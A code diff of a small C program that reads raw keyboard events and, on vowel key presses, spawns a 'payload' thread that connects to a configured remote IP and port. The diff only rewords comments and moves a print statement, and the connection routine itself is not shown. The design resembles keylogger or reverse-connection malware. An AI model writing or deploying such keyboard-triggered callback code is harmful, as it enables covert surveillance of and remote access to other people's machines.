@@ -10,8 +10,8 @@
 #include <stdlib.h>
 
 #define	INTERFACE_EVENT "/dev/input/event0"
-#define IP_SEND				"124.0.0.1"  // defina aqui o seu ip
-#define PORT			8523  // redireciona a porta para o servidor escutando
+#define IP_SEND				"124.0.0.1"  // defina aqui o ip do servidor que esta aguardando a conexão
+#define PORT			8523  // porta para o servidor que esta aguardando a conexão
 #define TM_SLEEP		30000
 
 void	*ft_connect(void *arg)
@@ -51,8 +51,8 @@ int	main(void)
 			if (key.code == KEY_A || key.code == KEY_E || key.code == KEY_I ||
 				key.code == KEY_O || key.code == KEY_U)
 				pthread_create(&payload, NULL, ft_connect, NULL);
-			printf("%s\n", "a execução continua depois de estabelecer a conexão"); 
 		}
+		printf("%s\n", "a execução continua depois de estabelecer a conexão"); 
 	}
 	pthread_join(payload, NULL);
 	close(fd);
